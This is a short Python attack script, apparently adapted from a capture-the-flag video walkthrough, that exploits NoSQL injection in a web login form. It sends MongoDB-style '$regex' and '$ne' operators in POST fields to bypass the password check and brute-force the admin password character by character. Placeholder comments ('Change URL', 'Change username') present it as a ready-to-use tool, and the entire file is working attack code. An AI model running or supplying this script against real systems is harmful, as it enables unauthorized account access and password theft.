# Ref https://www.youtube.com/watch?v=NO_lsfhQK_s&t=747s
# thanks to IppSec all credit goes to him  
import requests

def inject(data):
    # Send POST request to the specified URL with the provided data
    # Change URL
    r = requests.post('http://URL/', data=data, allow_redirects=False)
    if r.status_code != 200:
        # If the response status code is not 200, return True indicating injection success
        return True

secret = ""
payload = ""

while True:
    # Chnage parameters
    # Construct the data payload for the injection attack
    data = {"username[$regex]":"^" + payload + "$", "password[$ne]":"Ippsec", "login":"login"}
    if inject(data):
        # If injection is successful, break out of the loop
        break

    for i in range(32, 126):
        if chr(i) in ['.', '*', '?', '^', '+']:
            # If the character is in the specified list, escape it using a backslash
            payload = secret + "\\" + chr(i)
        else:
            # Append the character to the payload without escaping
            payload = secret + chr(i)

        print("\r" + payload, flush=False, end='')
# Change username
        data = {
            "username":"admin",
            "password[$regex]":"^" + payload,
            "login":"login"
        }

        if inject(data):
            # If injection is successful, print the payload and update the secret
            print("\r" + payload, flush=True, end='')
            secret = secret + chr(i)
            break

print()
